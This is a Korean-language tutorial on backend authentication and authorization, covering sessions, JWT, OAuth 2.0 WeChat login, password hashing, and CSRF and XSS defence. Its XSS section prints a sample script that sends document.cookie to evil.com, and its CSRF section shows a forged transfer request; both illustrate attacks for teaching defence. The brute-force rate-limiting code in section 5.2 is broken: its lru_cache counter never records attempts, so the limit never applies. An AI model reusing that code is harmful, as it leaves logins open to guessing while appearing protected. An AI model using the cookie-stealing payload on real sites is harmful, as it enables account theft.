# 인증과 권한 부여 기초
> 💡 **학습 가이드**: 이 장에서는 백엔드 시스템의 "출입 통제 시스템"인 인증(Authentication)과 권한 부여(Authorization)를 깊이 있게 살펴봅니다. 가장 기본적인 "당신은 누구인가"부터 시작하여 Session, JWT, OAuth 2.0 등 현대적인 인증 방식을 차근차근 익혀보겠습니다.

<AuthEvolutionDemo />

## 0. 들어가며: 시스템의 "출입 통제"

위챗에 로그인한 후, 앱을 껐다가 다시 열어도 로그인 상태가 유지되는 이유는 무엇일까요?
Bilibili에 접속했을 때, 당신이 프리미엄 회원인지 일반 사용자인지 어떻게 알 수 있을까요?
위챗 QR 코드로 서드파티 사이트에 로그인할 때, 비밀번호를 입력하지 않아도 되는 이유는 무엇일까요?

이 모든 것의 배후에는 핵심 시스템이 있습니다: **인증과 권한 부여 (Authentication & Authorization)**.

백엔드 시스템을 하나의 건물에 비유하자면:

- **인증 (Authentication)**: "당신은 누구인가"를 확인합니다 (신분증/출입 카드 검증).
- **권한 부여 (Authorization)**: "당신이 어디에 갈 수 있는가"를 확인합니다 (VIP는 VIP 라운지에 입장할 수 있지만, 일반 사용자는 불가능).

### 0.1 인증 도입 동기
단 하나의 이유입니다: **리소스 보호**.

- **개인정보 보호**: 당신의 개인 정보, 채팅 기록은 오직 당신만 볼 수 있습니다.
- **권한 제어**: 관리자는 사용자를 삭제할 수 있지만, 일반 사용자는 불가능합니다.
- **악용 방지**: 악의적인 호출, API 남용을 방지합니다.

<AuthBasicsDemo />

### 0.2 인터랙티브 데모: 로그인 흐름

실제 로그인 데모를 통해 인증과 권한 부여가 어떻게 작동하는지 이해해 봅시다.

<AuthInteractiveLoginDemo />

**핵심 포인트**: 인증은 첫 번째 방어선이며, 모든 민감한 작업은 반드시 먼저 신원을 확인해야 합니다.

---

## 1. 기본 개념: 인증 vs 권한 부여

### 1.1 인증 (Authentication): 당신은 누구인가

사용자의 신원을 확인합니다.

- _예시_: 사용자 이름과 비밀번호 입력, 지문 스캔, 안면 인식.
- _출력_: "당신"을 나타내는 토큰(Token).
- _영문 약어_: **AuthN**

### 1.2 권한 부여 (Authorization): 당신은 무엇을 할 수 있는가 개요

사용자가 어떤 권한을 가지고 있는지 확인합니다.

- _예시_: 관리자는 글을 삭제할 수 있고, 일반 사용자는 좋아요만 누를 수 있습니다.
- _출력_: 접근 허용 또는 거부.
- _영문 약어_: **AuthZ**

### 1.3 두 개념의 관계

```
사용자 요청 → 인증 (당신은 누구인가?) → 권한 부여 (이 작업을 할 수 있는가?) → 비즈니스 로직 실행
              ↓                          ↓
          신원 확인                  권한 확인
          (Token 유효?)             (delete 권한이 있는가?)
```

<AuthNvsAuthZDemo />

**핵심 포인트**: 먼저 인증하고, 그다음 권한을 부여합니다. "당신이 누구인지" 확인해야만 "당신이 무엇을 할 수 있는지" 판단할 수 있습니다.

---

## 2. 인증 방식의 발전사

### 2.1 1세대: HTTP Basic Authentication

가장 오래된 방식으로, 사용자 이름과 비밀번호를 HTTP 헤더에 직접 넣습니다.

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **장점**: 간단하며, 모든 브라우저가 지원합니다.
- **단점**:
  - 안전하지 않음 (Base64는 디코딩이 가능하여 사실상 평문과 같습니다).
  - 매 요청마다 비밀번호를 전송해야 함 (가로채기 쉽습니다).
  - 능동적으로 로그아웃할 수 없음 (브라우저를 닫지 않는 한).

**결론**: 내부 테스트 도구에만 적합하며, 절대 프로덕션 환경에서는 사용하지 마십시오.

### 2.2 2세대: Session + Cookie

웹 개발의 클래식한 방식입니다.

**흐름**:

```
1. 사용자 로그인 (POST /login)
   → 서버가 사용자 이름과 비밀번호를 검증
   → Session 생성 (서버 메모리 또는 Redis에)
   → Set-Cookie: session_id=abc123 반환

2. 이후 요청
   → 브라우저가 자동으로 Cookie: session_id=abc123을 포함
   → 서버가 session_id로 Session을 조회
   → 찾으면 "당신이 맞다"고 판단
```

**코드 예시**:

```python
# 백엔드 (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # 사용자 이름과 비밀번호 검증
    user = db.authenticate(username, password)
    if user:
        # Session 생성
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "사용자 이름 또는 비밀번호가 잘못되었습니다"}, 401

@app.route("/api/admin/users")
def get_users():
    # Session 확인
    if "user_id" not in session:
        return {"error": "로그인되지 않음"}, 401

    # 권한 확인
    if session.get("role") != "admin":
        return {"error": "권한 부족"}, 403

    # 비즈니스 로직 실행
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**장점**:

- 간단하고 직관적이며 이해하기 쉽습니다.
- 서버 측에서 능동적으로 로그아웃할 수 있습니다 (Session 삭제).

**단점**:

- **서버에 상태가 있음**: Session을 저장해야 하며, 여러 대의 서버는 공유 저장소(예: Redis)가 필요합니다.
- **크로스 도메인 어려움**: Cookie는 기본적으로 크로스 도메인을 지원하지 않습니다 (CORS 문제).
- **CSRF 공격**: 악성 웹사이트가 당신의 Cookie를 도용할 수 있습니다.

**결론**: 전통적인 웹 애플리케이션(서버 사이드 렌더링)에 적합하며, 모바일 및 현대적인 SPA에는 적합하지 않습니다.

### 2.3 3세대: Token (JWT)

현대 웹의 주류 방식입니다.

**핵심 아이디어**: 서버 측에 상태를 저장하지 않고, 사용자 정보를 암호화하여 Token으로 만들어 클라이언트에 저장합니다.

**JWT 구조**:

```
JWT = Header.Payload.Signature

예시:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**: 알고리즘 정보 (예: `{"alg": "HS256", "typ": "JWT"}`).
- **Payload**: 사용자 정보 (예: `{"user_id": 123, "role": "admin", "exp": 1616239022}`).
- **Signature**: 서명 (변조 방지).

**흐름**:

```python
# 1. 사용자 로그인
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # JWT 생성
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # 24시간 후 만료
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "사용자 이름 또는 비밀번호가 잘못되었습니다"}, 401

# 2. 이후 요청
@app.route("/api/admin/users")
def get_users():
    # Header에서 Token 가져오기
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "Token이 제공되지 않음"}, 401

    token = auth_header.split(" ")[1]

    try:
        # Token 검증 및 파싱
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Token이 만료되었습니다"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token이 유효하지 않습니다"}, 401

    # 권한 확인
    if payload.get("role") != "admin":
        return {"error": "권한 부족"}, 403

    # 비즈니스 로직 실행
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**장점**:

- **무상태**: 서버 측에서 Session을 저장하지 않아 수평적 확장이 용이합니다.
- **크로스 도메인 친화적**: Header에 포함되므로 Cookie의 크로스 도메인 제한을 받지 않습니다.
- **모바일 친화적**: 네이티브 앱에서도 쉽게 사용할 수 있습니다.
- **풍부한 정보**: Payload에 사용자 정보, 권한 등을 저장할 수 있습니다.

**단점**:

- **능동적 로그아웃 불가**: Token이 한 번 발급되면 만료될 때까지 계속 유효합니다 (블랙리스트를 사용하지 않는 한).
- **Payload 노출**: Base64 인코딩이므로 민감한 정보(예: 비밀번호)를 저장할 수 없습니다.
- **Token 크기**: 매 요청마다 포함해야 하며, 수백 바이트에 달합니다.

**결론**: 현대 웹 및 모바일의 표준 방식입니다.

<SessionVsJWTDemo />

---

## 3. OAuth 2.0: 서드파티 로그인

다음과 같은 버튼을 본 적이 있을 것입니다: "위챗으로 로그인", "Google로 로그인".

이것이 바로 **OAuth 2.0**입니다: **권한 부여** 프레임워크입니다 (인증이 아닙니다!).

### 3.1 핵심 역할

| 역할                     | 설명                   | 예시                 |
| :----------------------- | :--------------------- | :------------------- |
| **Resource Owner**       | 리소스 소유자 (사용자) | 당신                 |
| **Client**               | 서드파티 애플리케이션  | 어떤 웹사이트        |
| **Authorization Server** | 인증 서버              | 위챗, Google         |
| **Resource Server**      | 리소스 서버            | 위챗의 사용자 정보 API |

### 3.2 인증 코드 방식 (Authorization Code Flow)

가장 안전한 방식으로, 백엔드가 있는 서버에 적합합니다.

**흐름**:

```
1. 사용자가 "위챗으로 로그인" 클릭
   → 위챗 인증 페이지로 리다이렉트
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. 사용자가 QR 코드를 스캔하고 권한 부여에 동의
   → 위챗이 당신의 웹사이트로 리다이렉트
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. 당신의 백엔드가 code로 access_token 교환
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → 반환: { "access_token": "...", "openid": "..." }

4. access_token으로 사용자 정보 조회
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → 반환: { "nickname": "张三", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**코드 예시**:

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. 위챗 인증 페이지로 리다이렉트
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. code 가져오기
    code = request.args.get("code")
    state = request.args.get("state")

    # state 검증 (CSRF 방지)
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. code로 access_token 교환
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. 사용자 정보 조회
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. 로컬에서 사용자 생성 또는 업데이트
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. 자체 시스템의 JWT 생성
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**핵심 포인트**:

- **code는 한 번만 사용 가능**: 사용 후 즉시 무효화되어 가로채기를 방지합니다.
- **state로 CSRF 방지**: 무작위 문자열을 생성하여 콜백 시 검증함으로써 악성 웹사이트의 위조를 방지합니다.
- **redirect_uri는 반드시 일치해야 함**: 위챗 오픈 플랫폼에 미리 등록하여 리다이렉트 공격을 방지합니다.

### 3.3 기타 방식

| 방식                                  | 적용 시나리오                 | 보안성             |
| :------------------------------------ | :---------------------------- | :----------------- |
| **인증 코드 방식**                    | 백엔드가 있는 서버            | ⭐⭐⭐⭐⭐         |
| **암시적 방식 (Implicit)**            | 순수 프론트엔드 애플리케이션 (SPA) | ⭐⭐⭐ (권장하지 않음) |
| **비밀번호 방식 (Resource Owner)**    | 높은 신뢰도의 애플리케이션 (예: 공식 앱) | ⭐⭐               |
| **클라이언트 자격 증명 방식 (Client Credentials)** | 서버 간 통신 (사용자 없음)    | ⭐⭐⭐⭐           |

<OAuth2ModesDemo />

---

## 4. 실전: 완전한 인증 시스템 설계하기

### 4.1 요구사항 분석

- **멀티 플랫폼 지원**: Web, iOS, Android.
- **서드파티 로그인**: 위챗, Google.
- **권한 제어**: 일반 사용자, VIP, 관리자.
- **보안**: 남용 방지, 하이재킹 방지, 재전송 공격 방지.

### 4.2 아키텍처 설계

```
┌─────────────┐
│   클라이언트  │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting (속도 제한)     │
│  - Token Validation (검증)       │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service (인증 서비스)  │
│  - 회원가입, 로그인              │
│  - Token 발급 및 검증            │
│  - OAuth 2.0 통합                │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services             │
│  - User Service                  │
│  - Order Service                 │
│  - Payment Service               │
└─────────────────────────────────┘
```

### 4.3 데이터베이스 설계

```sql
-- 사용자 테이블
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- bcrypt 해시
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- 서드파티 로그인 연동 테이블
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- 서드파티의 사용자 ID
    access_token TEXT,  -- 암호화 저장
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Token 블랙리스트 (능동적 로그아웃용)
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JWT의 JTI (고유 식별자)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 코드 구현

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # 프로덕션 환경에서는 환경 변수 사용

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. 사용자 이름 중복 확인
        if db.get_user_by_username(username):
            raise ValueError("사용자 이름이 이미 존재합니다")

        # 2. 비밀번호 해시 (bcrypt)
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. 사용자 생성
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. Token 발급
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. 사용자 조회
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("사용자 이름 또는 비밀번호가 잘못되었습니다")

        # 2. 비밀번호 검증
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("사용자 이름 또는 비밀번호가 잘못되었습니다")

        # 3. Token 발급
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (단기, 예: 1시간)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # 고유 식별자
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (장기, 예: 30일)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # access_token 만료 시간 (초)
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh token이 만료되었습니다")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token이 유효하지 않습니다")

    def logout(self, token: str):
        # Token을 블랙리스트에 추가
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # 블랙리스트 확인
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token이 로그아웃되었습니다")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token이 만료되었습니다")
        except jwt.InvalidTokenError:
            raise ValueError("Token이 유효하지 않습니다")

# API 데코레이터
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # Header에서 Token 가져오기
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "Token이 제공되지 않음"}, 401

            token = auth_header.split(" ")[1]

            try:
                # Token 검증
                payload = auth_service.verify_token(token)
                # 사용자 정보를 요청 컨텍스트에 주입
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "로그인되지 않음"}, 401

            if request.user["role"] not in roles:
                return {"error": "권한 부족"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# 사용 예시
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. 보안 모범 사례

### 5.1 비밀번호 저장

**❌ 잘못된 방법**:

```python
# 평문 저장 (절대 금지!)
db.save_password(username, password)

# MD5 / SHA1 해시 (충분히 안전하지 않음, 레인보우 테이블로 쉽게 크래킹됨)
hash = md5(password)
db.save_password(username, hash)
```

**✅ 올바른 방법**:

```python
# bcrypt (적응형 해시, 느린 해시로 무차별 대입 공격 방지)
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # rounds가 클수록 더 안전하지만 더 느림
)

# 검증
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # 비밀번호 일치
```

**왜 bcrypt인가?**

- **느림**: 의도적으로 느리게 설계되어 (밀리초 단위) 무차별 대입 공격을 방지합니다.
- **적응형**: rounds를 조정할 수 있어 하드웨어 성능 향상에 따라 강화할 수 있습니다.
- **솔트**: 자체적으로 무작위 솔트를 포함하여 레인보우 테이블을 방지합니다.

<PasswordHashingDemo />

### 5.2 무차별 대입 공격 방지

- **속도 제한**: 동일 IP / 사용자 이름에 대해 1분에 5회만 시도 가능.
- **인증 코드**: 3회 실패 시 인증 코드 입력 요구.
- **계정 잠금**: 10회 실패 시 30분간 계정 잠금.

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """(시도 횟수, 첫 번째 시도 시간)을 반환"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # 1분 내에 초기화
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # 5회 초과 시 거부
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # 다시 캐시

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # 속도 제한 확인
    if not check_rate_limit(username):
        return {"error": "시도 횟수가 너무 많습니다. 1분 후에 다시 시도해 주세요"}, 429

    password = request.json["password"]

    # 비밀번호 검증
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # 로그인 성공, 카운트 초기화
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # 로그인 실패, 기록
        record_login_attempt(username)
        return {"error": "사용자 이름 또는 비밀번호가 잘못되었습니다"}, 401
```

### 5.3 CSRF 방어 (Cross-Site Request Forgery)

**공격 시나리오**:
당신이 은행 웹사이트 `bank.com`에 로그인한 후, 악성 웹사이트 `evil.com`을 방문했습니다. `evil.com`의 페이지에는 다음과 같은 코드가 있습니다:

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

당신의 브라우저는 은행의 Cookie를 포함하여 이 요청을 전송하고(크로스 도메인 요청), 자금이 이체됩니다.

**방어 조치**:

1.  **CSRF Token**:
    - 서버 측에서 무작위 Token을 생성하여 폼에 포함시킵니다.
    - 제출 시 Token이 일치하는지 검증합니다.

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # CSRF Token 검증
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token이 유효하지 않습니다"}, 403

    # 이체 실행
    ...
```

2.  **SameSite Cookie**:
    - Cookie의 `SameSite` 속성을 `Strict` 또는 `Lax`로 설정합니다.

```python
# Flask 예시
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # 또는 'Strict'
    SESSION_COOKIE_SECURE=True      # HTTPS만 허용
)
```

3.  **JWT 사용 (Cookie 미사용)**:
    - JWT는 `localStorage`에 저장되며 자동으로 포함되지 않아 기본적으로 CSRF에 안전합니다.

<CSRFDefenseDemo />

### 5.4 XSS 방어 (Cross-Site Scripting)

**공격 시나리오**:
악성 사용자가 댓글란에 다음과 같이 입력합니다:

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

웹사이트가 이 내용을 그대로 렌더링하면, 다른 사용자의 Cookie가 도난당합니다.

**방어 조치**:

1.  **출력 이스케이프**:
    - `<`를 `&lt;`로, `>`를 `&gt;`로 변환합니다.

```python
import html

def render_comment(comment):
    # HTML 이스케이프
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**:
    - HTTP 헤더를 설정하여 스크립트 출처를 제한합니다.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**:
    - Cookie의 `HttpOnly` 속성을 설정하면 JavaScript로 읽을 수 없습니다.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. 정리 및 학습 로드맵

인증은 백엔드 시스템의 "기본기"이며, 이를 숙지해야 안전하고 신뢰할 수 있는 애플리케이션을 구축할 수 있습니다.

### 6.1 핵심 지식 포인트

| 지식 포인트             | 중요도     | 난이도 | 실전 빈도 |
| :---------------------- | :--------- | :----- | :-------- |
| **Session + Cookie**    | ⭐⭐⭐⭐   | 중     | 높음      |
| **JWT**                 | ⭐⭐⭐⭐⭐ | 하     | 매우 높음 |
| **OAuth 2.0**           | ⭐⭐⭐⭐   | 상     | 높음      |
| **비밀번호 해시 (bcrypt)** | ⭐⭐⭐⭐⭐ | 하     | 매우 높음 |
| **속도 제한 및 무차별 대입 방지** | ⭐⭐⭐⭐⭐ | 중     | 매우 높음 |
| **CSRF 방어**           | ⭐⭐⭐⭐   | 중     | 중간      |
| **XSS 방어**            | ⭐⭐⭐⭐   | 하     | 높음      |

### 6.2 학습 로드맵

1.  **입문** (1-2일):
    - 인증 vs 권한 부여의 개념 이해.
    - Session + Cookie의 원리 숙지.
    - 간단한 로그인/회원가입 기능 구현.

2.  **심화** (1주):
    - JWT의 원리와 구현 학습.
    - JWT 기반 인증 시스템 구현.
    - 비밀번호 해시 (bcrypt) 숙지.

3.  **실전** (2-4주):
    - OAuth 2.0 통합 (위챗, Google 로그인).
    - 속도 제한, 무차별 대입 공격 방지 구현.
    - CSRF, XSS 등 일반적인 공격 방어.

4.  **심층** (지속적):
    - RBAC (역할 기반 접근 제어) 학습.
    - SSO (Single Sign-On) 연구.
    - Zero Trust Architecture (제로 트러스트 아키텍처) 탐구.

### 6.3 추천 자료

- **표준**:
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **문서**:
  - JWT.io: https://jwt.io/
  - OAuth 2.0 간체 중국어판: https://oauth.net/2/
- **도구**:
  - jwt.io (JWT 온라인 디버깅)
  - Postman (API 테스트)

---

## 7. 용어집 (Glossary)

| 용어              | 전체 이름                   | 설명                                                                                          |
| :---------------- | :-------------------------- | :-------------------------------------------------------------------------------------------- |
| **AuthN**         | Authentication              | **인증**. "당신은 누구인가"를 확인합니다 (예: 비밀번호 입력으로 신원 확인).                    |
| **AuthZ**         | Authorization               | **권한 부여**. "당신은 무엇을 할 수 있는가"를 확인합니다 (예: 관리자만 삭제 가능).              |
| **Session**       | -                           | **세션**. 서버 측에 저장된 사용자 상태 정보입니다.                                             |
| **Cookie**        | -                           | **쿠키**. 브라우저에 저장되는 작은 데이터 조각으로, 매 요청마다 자동으로 포함됩니다.            |
| **JWT**           | JSON Web Token              | **JSON 웹 토큰**. Header, Payload, Signature 세 부분으로 구성된 무상태 인증 방식입니다.         |
| **OAuth 2.0**     | -                           | **개방형 인증**. 서드파티 로그인의 표준화된 프레임워크입니다 (예: "위챗으로 로그인").            |
| **SSO**           | Single Sign-On              | **싱글 사인온**. 한 번 로그인하면 여러 애플리케이션에 접근할 수 있습니다 (예: Google 계정으로 모든 Google 서비스에 로그인). |
| **RBAC**          | Role-Based Access Control   | **역할 기반 접근 제어**. 사용자의 역할(예: admin, user)에 따라 권한을 결정합니다.               |
| **CSRF**          | Cross-Site Request Forgery  | **크로스 사이트 요청 위조**. 공격자가 사용자를 유도하여 악의적인 요청을 보내게 합니다 (예: 당신의 Cookie로 이체 요청). |
| **XSS**           | Cross-Site Scripting        | **크로스 사이트 스크립팅**. 공격자가 웹페이지에 악성 스크립트를 주입합니다 (예: Cookie 탈취).   |
| **bcrypt**        | -                           | **비밀번호 해시 알고리즘**. 비밀번호 저장에 특화된 느린 해시 알고리즘으로, 무차별 대입 공격을 방지합니다. |
| **Access Token**  | -                           | **액세스 토큰**. API 접근에 사용되는 단기 유효 토큰입니다.                                     |
| **Refresh Token** | -                           | **리프레시 토큰**. 새로운 Access Token을 발급받기 위한 장기 유효 토큰입니다.                    |
| **Scope**         | -                           | **권한 범위**. OAuth 2.0의 개념으로, 서드파티 애플리케이션이 요청하는 권한을 나타냅니다 (예: 사용자 정보 읽기). |
| **PKCE**          | Proof Key for Code Exchange | **코드 교환을 위한 증명 키**. OAuth 2.0의 확장으로, 퍼블릭 클라이언트(예: SPA)의 보안을 강화합니다. |